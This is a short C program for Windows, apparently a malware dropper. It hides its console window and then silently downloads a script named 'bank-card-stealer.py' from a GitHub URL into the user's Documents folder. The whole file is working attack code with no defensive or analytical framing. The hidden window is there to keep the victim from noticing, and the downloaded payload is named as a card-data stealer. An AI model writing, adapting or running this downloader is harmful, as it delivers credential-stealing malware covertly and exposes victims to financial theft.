#include <stdio.h>
#include <Urlmon.h>
#include <windows.h>
#include <winuser.h>
#pragma comment(lib, "urlmon.lib")  //URLDownloadToFileA function uses the urlmon.lib library so we need to add the library for the linker
#pragma comment(lib,"user32.lib") //ShowWindow function uses the user32.lib library so we need to add the library for the linker

// This function takes a handle to the result, the URL and the FILE
int UrlDownload(HRESULT hResult, const LPCSTR lURL, const LPCSTR lFILE) {

    hResult = URLDownloadToFileA(NULL, lURL, lFILE, 0, NULL);

    if (hResult == S_OK) {
        printf("Downloaded sucessfully");
    }
    else if (hResult == E_OUTOFMEMORY) {
        printf("The buffer is out of memory");
    }
    else if (hResult == INET_E_DOWNLOAD_FAILURE) {
        printf("The specified resource or callback interface was invalid");
    }
    return hResult;
}

int main() {

    //parameters for the URLDownloadToFileA function
    HRESULT hResult;
    const LPCSTR lURL =  "https://raw.githubusercontent.com/Manraj-b-cyber/Python-bank-card-stealer/main/bank-card-stealer.py";
    const LPCSTR lFILE = "C:/Users/Manraj-b-cyber/Documents/bank-card-stealer.py";

    //parameters for the ShowWindow function to hide the CMD
    HWND hCurrentWindow;
    hCurrentWindow = GetConsoleWindow();

    //hide CMD
    ShowWindow(hCurrentWindow, SW_HIDE);

    //Call the UrlDownload function and pass the handle to the result, the URL and file to create
    UrlDownload(hResult, lURL, lFILE);

    return 0;
}




